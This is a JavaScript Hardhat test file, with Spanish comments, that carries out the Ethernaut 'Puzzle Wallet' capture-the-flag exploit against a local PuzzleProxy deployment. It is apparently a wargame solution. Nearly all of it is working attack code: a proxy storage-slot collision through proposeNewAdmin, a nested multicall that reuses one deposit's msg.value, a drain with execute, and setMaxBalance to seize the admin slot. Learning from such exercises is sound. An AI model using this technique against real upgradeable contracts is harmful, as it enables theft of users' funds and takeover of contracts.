import { expect } from "chai";
import { ethers } from "hardhat";

describe.only("PuzzleWallet", async function () {

  it("Should has the attacker has admin", async function () {
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
    const puzzleWallet = await PuzzleWallet.deploy();
    await puzzleWallet.deployed();

    const [deployer, attacker] = await ethers.getSigners()

    // Signature de la función
    const functionSignature = 'init(uint256)';

    // Valor del argumento
    const argumentValue = ethers.BigNumber.from(deployer.address);

    // Genera el hash de la función utilizando keccak-256
    const functionHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(functionSignature)).slice(0, 10)

    const argumentBytes = ethers.utils.hexZeroPad(argumentValue.toHexString(), 32);

    const calldata = functionHash + argumentBytes.slice(2); // se omite el prefijo "0x"


    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
    const puzzleProxy = await PuzzleProxy.deploy(deployer.address, puzzleWallet.address, calldata);
    await puzzleProxy.deployed();

    const proxyAsImplementation = await ethers.getContractAt('PuzzleWallet', puzzleProxy.address)
    await proxyAsImplementation.addToWhitelist(deployer.address)
    await proxyAsImplementation.deposit({ value: 1000000000000000 })


    //---------------------------------------------

    //primero nos convertimos en owners gracias a la colision
    await puzzleProxy.connect(attacker).proposeNewAdmin(attacker.address);
    // convertido en owner me agrego a la whitelist
    await proxyAsImplementation.connect(attacker).addToWhitelist(attacker.address);

    const depositSignature = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("deposit()")).slice(0, 10)
    const multicallSignature = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("multicall(bytes[])")).slice(0, 10)
    const encodedData = ethers.utils.defaultAbiCoder.encode(
      ['bytes[]'],
      [[depositSignature]]
    );
    const multicallComplete = multicallSignature + encodedData.slice(2)

    await proxyAsImplementation.connect(attacker).multicall([multicallComplete, multicallComplete], { value: 1000000000000000 })

    await proxyAsImplementation.connect(attacker).execute(attacker.address, await proxyAsImplementation.balances(attacker.address), "0x")
    await proxyAsImplementation.connect(attacker).setMaxBalance(attacker.address)

    expect(await puzzleProxy.admin()).to.eq(attacker.address)
  });
});

